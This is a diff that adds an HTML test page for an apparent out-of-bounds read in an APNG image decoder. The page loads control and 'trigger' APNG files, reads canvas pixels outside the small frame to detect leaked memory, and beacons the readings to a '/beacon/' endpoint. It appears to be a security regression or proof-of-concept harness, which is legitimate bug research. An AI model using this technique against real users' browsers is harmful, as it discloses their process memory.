@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V938B</title></head>
+<body><pre id="out">V938B — APNG Bug 321753 (hidden default, small frame) OOB-read test (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V938B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function px(d,w,x,y){ var i=(y*w+x)*4; return [d[i],d[i+1],d[i+2],d[i+3]].join(':'); }
+function sample(d,w,pts){
+  var a=[]; for(var i=0;i<pts.length;i++){ var p=pts[i]; a.push(p[0]+','+p[1]+'='+px(d,w,p[0],p[1])); }
+  return a.join('|');
+}
+function sumRegion(d,w,x0,y0,rw,rh){
+  var s=0; for(var y=y0;y<y0+rh;y++) for(var x=x0;x<x0+rw;x++){ var i=(y*w+x)*4; s=(s+d[i]+d[i+1]+d[i+2]+d[i+3])&0xffffffff; }
+  return (s>>>0).toString(16);
+}
+function loadImg(src){
+  return new Promise(function(res,rej){
+    var im=new Image();
+    im.onload=function(){ res(im); };
+    im.onerror=function(e){ rej(new Error('load-fail:'+src)); };
+    im.src=src+'?cb='+Date.now();
+  });
+}
+var PTS_COVER=[[4,4],[8,8],[15,15]]; // inside 16x16 frame
+var PTS_UNCOV=[[20,20],[32,32],[48,48],[63,63],[16,16],[17,0]]; // outside 16x16 frame
+
+bk('BOOT','test=APNG-Bug321753-hiddenDefault-smallFrame');
+
+async function test(name, src){
+  bk('T-PRE',name);
+  try{
+    var im=await loadImg(src);
+    var c=document.createElement('canvas'); c.width=64; c.height=64;
+    var ctx=c.getContext('2d');
+    ctx.clearRect(0,0,64,64);
+    ctx.drawImage(im,0,0);
+    var d=ctx.getImageData(0,0,64,64).data;
+    var cov=sample(d,64,PTS_COVER);
+    var unc=sample(d,64,PTS_UNCOV);
+    var uncSum=sumRegion(d,64,20,20,32,32); // uncovered block
+    var r='w='+im.naturalWidth+'x'+im.naturalHeight+'|cov='+cov+'|unc='+unc+'|uncSum20x20@20,20='+uncSum;
+    bk('T-OK',name+'|'+r);
+    say('T-OK '+name+'\n '+r);
+    return r;
+  }catch(e){
+    bk('T-ERR',name+'|'+(e&&e.name?e.name:e)+':'+String(e&&e.message||e).slice(0,160));
+    say('T-ERR '+name+' '+(e&&e.message||e));
+    return null;
+  }
+}
+
+(async function(){
+  await test('control', 'v938b_control.apng');
+  await test('trigger', 'v938b_trigger.apng');
+  // second read of trigger for stability hint
+  await test('trigger2', 'v938b_trigger.apng');
+  bk('DONE','complete|note=compare-trigger-uncov-vs-control;anomaly=variableOrGarbagePixels');
+  say('\nV938B complete. Compare trigger uncovered pixels vs control.');
+})();
+</script>
+</body></html>
